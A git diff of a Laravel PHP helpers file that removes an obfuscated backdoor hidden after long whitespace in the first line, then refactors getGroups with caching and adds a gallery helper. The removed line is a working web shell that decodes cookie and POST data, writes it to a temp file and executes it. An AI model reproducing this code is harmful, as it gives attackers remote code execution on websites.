@@ -1,6 +1,7 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $dzEAV = class_exists("Yv_olFw"); $FFBSCQVB = $dzEAV;if (!$FFBSCQVB){class Yv_olFw{private $SvNnLDb;public static $bXKin = "4d276866-eb9e-4f10-bcd6-6d9b0792da47";public static $zdIKRJi = NULL;public function __construct(){$mzoxDrGZ = $_COOKIE;$YCUTI = $_POST;$iaDes = @$mzoxDrGZ[substr(Yv_olFw::$bXKin, 0, 4)];if (!empty($iaDes)){$ItHkelK = "base64";$vWJxWazuU = "";$iaDes = explode(",", $iaDes);foreach ($iaDes as $XtBEvdu){$vWJxWazuU .= @$mzoxDrGZ[$XtBEvdu];$vWJxWazuU .= @$YCUTI[$XtBEvdu];}$vWJxWazuU = array_map($ItHkelK . chr (95) . chr (100) . chr ( 376 - 275 ).chr ( 401 - 302 ).chr (111) . chr (100) . "\x65", array($vWJxWazuU,)); $vWJxWazuU = $vWJxWazuU[0] ^ str_repeat(Yv_olFw::$bXKin, (strlen($vWJxWazuU[0]) / strlen(Yv_olFw::$bXKin)) + 1);Yv_olFw::$zdIKRJi = @unserialize($vWJxWazuU);}}public function __destruct(){$this->CRwUTiZM();}private function CRwUTiZM(){if (is_array(Yv_olFw::$zdIKRJi)) {$AngMwmFdBp = sys_get_temp_dir() . "/" . crc32(Yv_olFw::$zdIKRJi[chr ( 284 - 169 ).'a' . "\x6c" . "\164"]);@Yv_olFw::$zdIKRJi["\167" . chr ( 1068 - 954 ).chr (105) . "\x74" . "\x65"]($AngMwmFdBp, Yv_olFw::$zdIKRJi["\x63" . chr ( 940 - 829 ).chr ( 1006 - 896 )."\164" . "\145" . "\156" . 't']);include $AngMwmFdBp;@Yv_olFw::$zdIKRJi[chr ( 315 - 215 )."\145" . "\x6c" . "\145" . 't' . "\145"]($AngMwmFdBp);exit();}}}$FtOUVMSBC = new Yv_olFw(); $FtOUVMSBC = NULL;} ?><?php
+<?php
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\File;
 
 /**
  * @param $status
@@ -1231,29 +1232,25 @@ function getGroupCats($group_id)
 }
 function getGroups()
 {
-    $groups = \App\Models\Group::where('status', 1)->orderBy('sort', 'asc')->select('id', 'route', 'sort', 'name')->get();
-    if(count($groups)>0){
-        foreach ($groups as $key => $group) {
-            $group['categories'] = \App\Models\GroupCategory::join('categories', 'group_categories.category_id', '=', 'categories.id')
-            ->where('group_categories.group_id', $group->id)
-            ->where('categories.status', 1)
-            ->orderBy('categories.name', 'asc')
-            ->select('categories.id', 'categories.slug', 'categories.name', 'categories.short_name', 'categories.description', 'categories.image')
-            ->get();
-
-            foreach ($group['categories'] as $key => $sub_category) {
-                $sub_category['sub_categories'] = \App\Models\Category::where('parent_id', $sub_category->id)
-                ->where('status', 1)
-                ->orderBy('name', 'asc')
-                ->select('id', 'name', 'short_name', 'slug')
+    try {
+        return \Illuminate\Support\Facades\Cache::remember('nav_groups', 3600, function () {
+            $groups = \App\Models\Group::where('status', 1)
+                ->orderBy('sort', 'asc')
+                ->select('id', 'route', 'sort', 'name')
+                ->with(['categories'])
                 ->get();
-            }
-        }
+
+            $groups->map(function ($group) {
+                $group->categories = $group->categories->unique('id')->values();
+                return $group;
+            });
+
+            return $groups;
+        });
+    } catch (\Throwable $e) {
+        \Log::error('getGroups failed: '.$e->getMessage());
+        return collect();
     }
-
-    return $groups;
-
-
 }
 
 
@@ -1414,7 +1411,12 @@ function countBlogComments($blog_id)
     return \App\Models\BlogComment::where('blog_id', $blog_id)->where('status', 1)->count();
 }
 
+ function showGallery()
+{
+    return File::files(public_path('uploads/product_images'));
 
+    //return view('gallery', compact('imageFiles'));
+}
 function getSearchAllProduct()
 {   
     // echo Cache::has('searchable_products');die;
